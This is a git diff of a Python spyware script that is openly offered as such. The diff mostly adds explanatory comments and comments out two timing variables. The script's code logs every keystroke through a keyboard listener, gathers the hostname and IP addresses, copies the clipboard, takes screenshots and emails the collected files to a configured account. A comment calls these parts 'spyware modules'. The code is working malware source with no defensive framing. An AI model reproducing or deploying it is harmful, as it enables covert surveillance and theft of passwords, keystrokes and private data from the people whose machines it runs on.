@@ -1,3 +1,6 @@
+# Still working on adding encryption, getpass, and a way to iterate screenshots
+# All unused modules are for that
+
 from email import encoders
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
@@ -22,21 +25,25 @@ from requests import get
 from multiprocessing import Process, freeze_support
 from PIL import ImageGrab
 
+# Declaring important variables for data storage
 keys_info = "keysInfo.txt"
 system_info = "system_info.txt"
 clipboard_info = "clipboard.txt"
 screenshot_info = "screenshot.png"
 
-time_iteration = 15
-num_iterations_end = 3
+# time_iteration = 15
+# num_iterations_end = 3
 
+# Email account the information will be sent to
 emailAddress = ""
 password = ""
 toAddress = ""
 
+# File path the data variables will be stored into
 file_path = ""
 extend = "\\"
 
+# Creating an array to hold keys, and starting a counter to reset key presses.
 count = 0
 keys = []
 
@@ -55,6 +62,7 @@ def on_press(key):
         keys = []
 
 
+# Writes the files to the log and cleans up the output
 def write_file(key):
     with open(file_path + extend + keys_info, "a") as f:
         for key in key:
@@ -67,15 +75,18 @@ def write_file(key):
                 f.close()
 
 
+# Ads a kill switch as pressing "esc"
 def on_release(key):
     if key == Key.esc:
         return False
 
 
+# Starts the listener
 with Listener(on_press=on_press, on_release=on_release) as Listener:
     Listener.join()
 
 
+# Using MIMEMultipart to automate sending emails, found a couple of great guides on tihs
 def send_email(filename, attachment, toAddress):
     fromAddress = emailAddress
     msg = MIMEMultipart()
@@ -102,6 +113,7 @@ def send_email(filename, attachment, toAddress):
 send_email(keys_info, file_path + extend + keys_info, toAddress)
 
 
+# Extracts a lot of information about the computer and saves it to the file path
 def computer_info():
     with open(file_path + extend + system_info, "a") as f:
         hostname = socket.gethostname()
@@ -121,6 +133,7 @@ def computer_info():
         f.write("Private IP Address: " + ipAddress + '\n')
 
 
+# Copy the clipboard and save it to the file path
 def copy_clipboard():
     with open(file_path + extend + clipboard_info, "a") as f:
         try:
@@ -134,10 +147,13 @@ def copy_clipboard():
             f.write("Could not copy clipboard")
 
 
+# Taking a screenshot
 def screenshot():
     im = ImageGrab.grab()
     im.save(file_path + extend + screenshot_info)
 
+
+# Calling all of the spyware modules and emailing the results.
 
 copy_clipboard()
 send_email(clipboard_info, file_path + extend + clipboard_info, toAddress)
